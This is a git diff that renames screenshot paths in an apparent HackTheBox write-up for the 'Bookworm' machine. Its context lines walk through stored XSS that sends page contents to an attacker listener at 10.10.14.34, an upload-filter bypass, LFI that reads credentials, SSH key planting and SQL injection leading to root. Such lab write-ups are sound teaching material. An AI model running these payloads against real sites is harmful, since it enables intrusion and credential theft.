@@ -21,27 +21,27 @@ Just two ports open. We have to add `bookworm.htb` to our `/etc/hosts` file to a
 
 Port 80 was an online bookstore site with books for sale:
 
-![](<../../.gitbook/assets/image%20(876).png>)
+![](../../.gitbook/assets/bookworm-26.png)
 
 We can view the shop to find some books on sale:
 
-![](<../../.gitbook/assets/image%20(1065).png>)
+![](../../.gitbook/assets/bookworm-1.png)
 
 Proxying the traffic through Burpsuite reveals that this is an Express based website:
 
-![](<../../.gitbook/assets/image%20(1733).png>)
+![](../../.gitbook/assets/bookworm-3.png)
 
 The website allows us to create a user, and afterwards we can access the cart and checkout functions. Immediately after adding my book, we can see that the website updates to show that:
 
-![](<../../.gitbook/assets/image%20(3897).png>)
+![](../../.gitbook/assets/bookworm-23.png)
 
 I looked through the traffic and refreshed the page. This time, the Updates included another user who was adding books to their basket:
 
-![](<../../.gitbook/assets/image%20(2678).png>)
+![](../../.gitbook/assets/bookworm-13.png)
 
 So this is the first indication that **there was another user present on the site and interacting with the shop**. Within the checkout function, there was an Edit Note function available.
 
-![](<../../.gitbook/assets/image%20(3062).png>)
+![](../../.gitbook/assets/bookworm-19.png)
 
 I took note of the 'download books' option since it was removed. There was mention of 'old orders still being downloadable', which might come in handy later. Since there was a user also accessing the site, I figured that XSS might be the exploit path here, so I entered a basic payload:
 
@@ -51,27 +51,27 @@ I took note of the 'download books' option since it was removed. There was menti
 
 After updating the note and completing the checkout, I received a callback on our HTTP server.
 
-![](<../../.gitbook/assets/image%20(4030).png>)
+![](../../.gitbook/assets/bookworm-24.png)
 
 So XSS was possible, but right now it's only viewable by us and we need to somehow figure out how to inject this into the cart of others. I took a look at the POST request made, and found that a number was used as the cart identifier:
 
-![](<../../.gitbook/assets/image%20(2543).png>)
+![](../../.gitbook/assets/bookworm-11.png)
 
 On a side note, I noticed that there were different usernames for the bot each time I refreshed the page:
 
-![](<../../.gitbook/assets/image%20(3855).png>)
+![](../../.gitbook/assets/bookworm-22.png)
 
 Examining the page source reveals that there was some number associated with the updates:
 
-![](<../../.gitbook/assets/image%20(2246).png>)
+![](../../.gitbook/assets/bookworm-9.png)
 
 This number incremented itself each time, and it was likely that this is the same number used for the cart ID, giving us an opportunity to inject XSS payloads into the cart of the bot. Apart from the checkout, viewing the user profile reveals that we can upload an avatar to the site:
 
-![](<../../.gitbook/assets/image%20(2686).png>)
+![](../../.gitbook/assets/bookworm-14.png)
 
 We can try uploading some basic Javascript files (since this was likely an XSS-based initial access). After some trial and error, I found that by changing the `Content-Type` header to `image/jpeg`, we can bypass the content check and upload whatever we want.
 
-![](<../../.gitbook/assets/image%20(968).png>)
+![](../../.gitbook/assets/bookworm-28.png)
 
 ### Profile XSS -> Steal Page
 
@@ -97,11 +97,11 @@ quantity=1&note=%3Cimg+src%3D%22http%3A%2F%2F10.10.14.34%2F%3Fbotcallback%22%3E
 
 This payload works in getting a callback from the machine itself.
 
-![](<../../.gitbook/assets/image%20(931).png>)
+![](../../.gitbook/assets/bookworm-27.png)
 
 Interestingly, when we send the above request, we would get a `base64` encoded cookie which indicates that our avatar is loaded, which might be our XSS point:
 
-![](<../../.gitbook/assets/image%20(2688).png>)
+![](../../.gitbook/assets/bookworm-15.png)
 
 We can test this first by updating our profile picture with the following request:
 
@@ -130,17 +130,17 @@ fetch("http://10.10.14.34/?profilebotcallback")
 
 When we refresh our `/profile` page, we can see that our image is located at a certain static directory:
 
-![](<../../.gitbook/assets/image%20(2220).png>)
+![](../../.gitbook/assets/bookworm-8.png)
 
 After waiting for a bit, we would eventually get a callback using this method:
 
-![](<../../.gitbook/assets/image%20(3540).png>)
+![](../../.gitbook/assets/bookworm-20.png)
 
 There was mention of 'old orders' being used, so I wanted to see if we could steal page contents via XSS. The stealing of cookies won't work in this case since the `Set-Cookie` header had the `httponly` value, so stealing pages is the only other method.
 
 To do this, we can create a Flask server to redirect the bot to other pages. The `/profile` endpoint had an Order History record at the bottom:
 
-![](<../../.gitbook/assets/image%20(562).png>)
+![](../../.gitbook/assets/bookworm-25.png)
 
 So the exploit path is to redirect the bot to their own `/profile` directory and view their old orders via injecting Javascript code into our profile picture.
 
@@ -161,7 +161,7 @@ xhr.send(null);
 
 The above payload doesn't work, but we can at least confirm that page stealing is the way to go:
 
-![](<../../.gitbook/assets/image%20(1963).png>)
+![](../../.gitbook/assets/bookworm-5.png)
 
 I took a break from this machine while waiting for it to be hosted on the SG VPN for stability (so that's why the IP addresses are different later). Afterwards, I edited the Javascript code a bit to wait for the page to load before sending me the contents:
 
@@ -177,7 +177,7 @@ stealpage("http://bookworm.htb/profile")
 
 Afterwards, I would get a callback with a huge base64 encoded string at the back:
 
-![](<../../.gitbook/assets/image%20(1795).png>)
+![](../../.gitbook/assets/bookworm-4.png)
 
 Here's the interseting part of the page decoded:
 
@@ -310,7 +310,7 @@ fetch("http://bookworm.htb/profile")
 
 This would give us a huge base64 string, which can be decoded into a `.zip` file and unzipped to find the contents of `/etc/passwd`.
 
-![](<../../.gitbook/assets/image%20(1097).png>)
+![](../../.gitbook/assets/bookworm-2.png)
 
 This confirms that we have LFI on the machine, and we can proceed to enumerate `/proc/self/cmdline` to view the active processes on the machine (since we don't have anything else to read):
 
@@ -343,11 +343,11 @@ const port = 3000;
 
 It seems that this requires a `database.js` file to be run. So, we can read `/proc/self/cwd/database.js` next, and within it we can find user credentials!
 
-![](<../../.gitbook/assets/image%20(2152).png>)
+![](../../.gitbook/assets/bookworm-7.png)
 
 Then, we can `ssh` in using `frank` as the username.
 
-![](<../../.gitbook/assets/image%20(2815).png>)
+![](../../.gitbook/assets/bookworm-17.png)
 
 ## Privilege Escalation
 
@@ -420,7 +420,7 @@ udp        0      0 0.0.0.0:68              0.0.0.0:*                           
 
 We can forward this using `chisel` and view the site:
 
-![](<../../.gitbook/assets/image%20(2803).png>)
+![](../../.gitbook/assets/bookworm-16.png)
 
 I found the documentation for this application here:
 
@@ -428,15 +428,15 @@ I found the documentation for this application here:
 
 Here's the initial response intercepted in Burp:
 
-![](<../../.gitbook/assets/image%20(259).png>)
+![](../../.gitbook/assets/bookworm-12.png)
 
 I played around with the `outputType` variable and tried LFI again, and it worked:
 
-![](<../../.gitbook/assets/image%20(3743).png>)
+![](../../.gitbook/assets/bookworm-21.png)
 
 Within the machine, it creates this file with `neil` permissions:
 
-![](<../../.gitbook/assets/image%20(2106).png>)
+![](../../.gitbook/assets/bookworm-6.png)
 
 This means we have an arbitrary file write as the `neil` user, and we can try to drop our SSH public key into his `authorized_keys` folder. I tried to directly write it to that folder but it doesn't work, and I think we have to maintain the `.txt` extension.
 
@@ -481,7 +481,7 @@ Content-Disposition: form-data; name="outputType"
 
 Then we can `ssh` in as `neil`.
 
-![](<../../.gitbook/assets/image%20(2926).png>)
+![](../../.gitbook/assets/bookworm-18.png)
 
 ### SQL PostScript Injection
 
@@ -611,6 +611,6 @@ addressLine2, '1' as town, '1' as postcode, 0 as orderId, 1 as userId;"
 
 Then, we can just `ssh` into `root` from our `kali` machine.
 
-![](<../../.gitbook/assets/image%20(2293).png>)
+![](../../.gitbook/assets/bookworm-10.png)
 
 Rooted!
